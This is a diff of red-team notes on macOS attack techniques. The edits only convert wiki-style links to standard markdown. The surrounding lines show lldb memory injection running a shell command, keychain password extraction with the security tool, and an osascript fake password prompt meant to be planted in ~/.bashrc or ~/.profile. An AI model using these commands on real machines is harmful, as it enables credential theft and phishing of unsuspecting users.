@@ -31,7 +31,7 @@ lldp -p <pid>
 > You can inject code into memory:
 > `(lldb) p (void) system("whoami &> /tmp/log.txt")`
 
-![[Linux#2- Decrypting TLS traffic using TLS key logging Not working on latest firefox and chrome]]
+[Linux#2- Decrypting TLS traffic using TLS key logging Not working on latest firefox and chrome](linux.md%232-%20Decrypting%20TLS%20traffic%20using%20TLS%20key%20logging%20Not%20working%20on%20latest%20firefox%20and%20chrome)
 
 ---
 # MacOS keychain
@@ -47,7 +47,7 @@ security find-internet-password -a "someaccount@gmail.com" -w
 ```
 The good thing (bad for the red teamer) about the Keychain is that it requires the user's password to access and open:
 
-![[keychainpopup.png]]
+![keychainpopup](attachments/keychainpopup.png)
 
 If the Keychain is locked, it can be unlocked with this command:
 ```bash
@@ -55,7 +55,7 @@ security unlock-keychain
 ```
 This will prompt for the user's password to unlock the Keychain (if it is locked):
 
-![[keychainpopup2.png]]
+![keychainpopup2](attachments/keychainpopup2.png)
 
 ---
 # Phishing and credential dialog spoofing
@@ -64,7 +64,7 @@ This will prompt for the user's password to unlock the Keychain (if it is locked
 osascript -e 'display notification "Hello World!"'
 ```
 
-![[osascript.png]]
+![osascript](attachments/osascript.png)
 
 - Create a password dialog
 ```bash
@@ -76,7 +76,7 @@ answer')
 echo $PWD_SPOOF
 ```
 
-![[osascriptPWD.png]]
+![osascriptPWD](attachments/osascriptPWD.png)
 
 > **Note:**
 >  One of the ways to deploy this is by putting it in ~/.profile or ~/.bashrc or by sending it in a file.
